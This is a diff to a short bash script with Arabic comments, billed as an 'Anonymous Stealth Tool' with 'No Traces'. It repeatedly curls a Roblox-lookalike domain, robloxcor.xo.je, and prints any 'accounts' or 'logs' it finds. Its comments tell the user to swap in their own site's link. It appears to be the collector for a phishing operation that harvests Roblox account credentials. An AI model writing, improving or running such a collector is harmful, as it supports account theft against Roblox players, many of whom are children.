@@ -1,18 +1,40 @@
 #!/bin/bash
-# أداة xxszmsx
+# Anonymous Stealth Tool
+# No Names - No Traces
+
+# تنظيف الشاشة وألوان احترافية
 clear
-echo "======================================"
-echo "      TOOL xxszmsx BY roblox           "
-echo "======================================"
-echo "[+] Link: https://robloxcor.xo.je/"
-echo "[+] Checking for new accounts..."
-echo "--------------------------------------"
+echo -e "\e[1;31m  ██████  ██   ██  ███████  ███████  ███    ███ \e[0m"
+echo -e "\e[1;31m  ██       ██ ██      ███      ███   ████  ████ \e[0m"
+echo -e "\e[1;37m  ██████    ███      ███      ███    ██ ████ ██ \e[0m"
+echo -e "\e[1;37m       ██  ██ ██    ███      ███     ██  ██  ██ \e[0m"
+echo -e "\e[1;34m  ██████  ██   ██  ███████  ███████  ██      ██ \e[0m"
+echo "------------------------------------------------"
+echo "[+] STATUS: ACTIVE"
+echo "[+] SECURED CONNECTION: ENABLED"
+echo "------------------------------------------------"
 
-# الأمر ده هيسحب الحسابات من موقعك ويعرضها في كالي فوراً
+# الرابط السري اللي بيسحب منه البيانات من انفينيتي فري
+# ملاحظة: غير الرابط ده برابط موقعك الحقيقي
+URL="https://robloxcor.xo.je/data_77x_z9.txt"
+
+echo "[!] Monitoring for incoming logs..."
+echo "[!] Press CTRL+C to stop."
+echo ""
+
+# حلقة تكرار ذكية بتجيب البيانات الجديدة كل 5 ثواني
 while true; do
-    curl -s https://robloxcor.xo.je/cashing.txt
-    sleep 10
-    clear
-    echo "Checking for new accounts... (Press CTRL+C to stop)"
+    # -s عشان يشتغل بصمت و -f عشان ميعرضش أخطاء لو الملف لسه فاضي
+    data=$(curl -s -f "$URL")
+    
+    if [ ! -z "$data" ]; then
+        clear
+        echo "================ LOGS DETECTED ================"
+        echo "$data"
+        echo "==============================================="
+    else
+        echo -ne "Scanning for logs... \r"
+    fi
+    
+    sleep 5
 done
-
